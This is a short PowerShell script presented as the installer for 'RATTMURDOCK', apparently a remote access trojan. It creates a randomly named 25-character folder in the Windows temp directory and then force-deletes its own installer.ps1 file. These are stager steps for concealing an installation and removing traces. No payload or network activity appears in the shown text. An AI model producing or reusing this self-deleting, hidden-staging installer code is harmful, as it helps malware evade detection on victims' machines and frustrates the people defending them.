# this RATTMURDOCK installer file
# Created by : NinjaCat811


function Get-RandomString {
    param (
        [int]$length = 10  # Default length of the random string
    )
    # !@#$%^&*()-_=+[]{}|;:,.<>?
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((1..$length) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}

# variables :   
$initial_path =  Get-Location
$temp_folder = $env:TEMP
$newFolderPath = Join-Path -Path $temp_folder -ChildPath $wrdir
$removedItemPath = Join-Path -Path $initial_path -ChildPath "installer.ps1"

do {
    $wrdir = Get-RandomString -length 25
    $newFolderPath = Join-Path -Path $temp_folder -ChildPath $wrdir
} until (-not (Test-Path $newFolderPath))

New-Item -Path $newFolderPath -ItemType Directory

Write-Output "New folder created: $newFolderPath"

Remove-Item -Path $removedItemPath -Force





